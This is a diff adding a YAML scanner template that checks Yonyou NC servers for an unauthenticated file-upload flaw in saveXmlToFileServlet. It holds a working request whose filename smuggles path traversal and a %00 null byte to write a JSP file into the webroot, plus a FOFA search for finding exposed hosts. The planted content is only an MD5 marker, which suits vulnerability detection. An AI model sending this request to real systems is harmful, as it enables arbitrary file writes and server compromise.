@@ -1,0 +1,32 @@
+id: yonyou-nc-savexmltofileservlet-fileupload
+
+info:
+  name: YONYOU NC saveXmlToFIleServlet接口文件上传
+  author: free2e
+  severity: critical
+  verified: true
+  description: |-
+    fofa: title="YONYOU NC"
+  reference:
+    - https://mp.weixin.qq.com/s/GF6BR3I2k4QJoc7CRy4mfA
+  tags: yonyou,fileupload
+  created: 2024/05/11
+
+set:
+  randfile: randomLowercase(5)
+  md5str: md5(randfile)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{randfile}}.jsp%00
+      headers:
+        Content-Type: application/octet-stream
+      body: "{{md5str}}"
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{randfile}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(md5str))
+expression: r0() && r1()
